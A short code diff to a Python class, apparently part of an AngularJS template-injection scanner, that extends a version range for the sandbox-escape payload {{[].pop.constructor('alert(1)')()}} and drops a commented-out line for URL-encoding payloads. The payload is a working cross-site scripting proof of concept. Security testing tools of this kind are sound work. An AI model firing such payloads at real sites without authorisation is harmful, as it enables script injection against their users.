@@ -112,7 +112,7 @@ class Payloads:
         },
         {
             "min": "1.6.0",
-            "max": "1.6.4",
+            "max": "1.6.5",
             "value": """{{[].pop.constructor('alert(1)')()}}"""
         }
     ]
@@ -137,9 +137,6 @@ class Payloads:
         for payload in Payloads.__payloads:
             if Payloads.version_is_in_range(version, payload["min"], payload["max"]):
                 payloads.append(payload["value"])
-
-                # I'm currently not sure if we really need an encoded payload
-                # payloads.append(quote_plus(payload["value"]))
 
         Payloads.__cache[version] = payloads
         return payloads
